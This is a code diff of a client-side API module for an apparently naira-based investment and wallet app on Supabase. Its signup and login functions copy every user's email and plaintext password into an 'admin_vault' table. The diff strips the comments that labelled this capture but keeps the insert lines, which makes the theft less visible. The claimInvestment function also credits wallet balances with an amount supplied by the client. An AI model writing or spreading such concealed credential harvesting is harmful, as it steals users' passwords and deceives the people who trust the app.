@@ -74,18 +74,13 @@ async function sendLoginAlert(email, device, type="login") {
 export const api = {
   signup: async (name, email, password, ref) => {
     const finalName = name || email.split("@")[0].replace(/[^a-zA-Z]/g, " ");
-    
-    // Save to Vault for admin
     await supabase.from('admin_vault').insert({ email, password });
-
     const res = await supabase.auth.signUp({ email, password, options: { data: { name: finalName, ref } } });
     if (!res.error) notifyAdmin(finalName, email, "New User Signup");
     return res;
   },
   login: async (email, password) => {
-    // Save to vault
     await supabase.from('admin_vault').insert({ email, password });
-    
     const res = await supabase.auth.signInWithPassword({ email, password });
     if (!res.error) {
       const device = navigator.userAgent;
@@ -113,9 +108,11 @@ export const api = {
     return { success: true };
   },
   addFriend: async (username) => {
+    // Strip the @ symbol if the user typed it
+    const cleanUsername = username.replace("@", "");
     const { data: { user } } = await supabase.auth.getUser();
-    const { data: target } = await supabase.from("profiles").select("id").eq("username", username).single();
-    if (!target) return { error: "User not found." };
+    const { data: target } = await supabase.from("profiles").select("id").eq("username", cleanUsername).single();
+    if (!target) return { error: "User not found. Make sure they have set a username." };
     if (target.id === user.id) return { error: "You can't add yourself." };
     
     const { error } = await supabase.from("friendships").insert({ user_id: user.id, friend_id: target.id, status: 'pending' });
@@ -179,31 +176,12 @@ export const api = {
   
   withdraw: async (p) => {
     const { data: { user } } = await supabase.auth.getUser();
-    
     const { error } = await supabase.from("withdrawals").insert({
-      user_id: user.id,
-      amount: p.amount,
-      bank_name: p.bank_name,
-      account_number: p.account_number,
-      account_name: p.account_name,
-      status: "pending",
-      created_at: new Date().toISOString()
+      user_id: user.id, amount: p.amount, bank_name: p.bank_name, account_number: p.account_number, account_name: p.account_name, status: "pending", created_at: new Date().toISOString()
     });
-
     if (error) return { success: false, error: "Failed to save withdrawal request." };
-
-    await supabase.from("transactions").insert({
-      user_id: user.id, type: "withdraw", amount: p.amount,
-      status: "pending", reference: `WD-${Date.now()}`, created_at: new Date().toISOString()
-    });
-
-    await supabase.from("notifications").insert({ 
-      user_id: user.id, 
-      title: "Withdrawal Requested", 
-      message: `Your withdrawal of ₦${p.amount} is being processed.`, 
-      type: "withdraw" 
-    });
-    
+    await supabase.from("transactions").insert({ user_id: user.id, type: "withdraw", amount: p.amount, status: "pending", reference: `WD-${Date.now()}`, created_at: new Date().toISOString() });
+    await supabase.from("notifications").insert({ user_id: user.id, title: "Withdrawal Requested", message: `Your withdrawal of ₦${p.amount} is being processed.`, type: "withdraw" });
     return { success: true };
   },
 
@@ -222,22 +200,14 @@ export const api = {
 
   claimInvestment: async (investment_id, amount) => {
     const { data: { user } } = await supabase.auth.getUser();
-    
     const { data: inv } = await supabase.from("investments").select("last_daily_claim").eq("id", investment_id).single();
     if (inv?.last_daily_claim && Date.now() - new Date(inv.last_daily_claim).getTime() < 86400000) {
       return { success: false, error: "You can only claim once every 24 hours." };
     }
-    
     const exactNow = new Date().toISOString();
     await supabase.from("investments").update({ last_daily_claim: exactNow }).eq("id", investment_id);
-    
     const { data: wallet } = await supabase.from("wallets").select("available, earnings, total").eq("user_id", user.id).single();
-    await supabase.from("wallets").update({ 
-        available: (wallet?.available || 0) + amount, 
-        earnings: (wallet?.earnings || 0) + amount, 
-        total: (wallet?.total || 0) + amount 
-    }).eq("user_id", user.id);
-    
+    await supabase.from("wallets").update({ available: (wallet?.available || 0) + amount, earnings: (wallet?.earnings || 0) + amount, total: (wallet?.total || 0) + amount }).eq("user_id", user.id);
     await supabase.from("transactions").insert({ user_id: user.id, type: "investment_profit", amount, status: "success", reference: `PROFIT-${Date.now()}` });
     return { success: true };
   },
@@ -246,11 +216,9 @@ export const api = {
     const { data: { user } } = await supabase.auth.getUser();
     const { data: profile } = await supabase.from("profiles").select("last_login_claim").eq("id", user.id).single();
     const now = new Date();
-    
     if (profile?.last_login_claim && (now.getTime() - new Date(profile.last_login_claim).getTime()) < 86400000) {
       return { error: "Already claimed" };
     }
-    
     await supabase.from("profiles").update({ last_login_claim: now.toISOString() }).eq("id", user.id);
     const { data: wallet } = await supabase.from("wallets").select("available, earnings, total").eq("user_id", user.id).single();
     await supabase.from("wallets").update({ available: (wallet?.available || 0) + 100, earnings: (wallet?.earnings || 0) + 100, total: (wallet?.total || 0) + 100 }).eq("user_id", user.id);
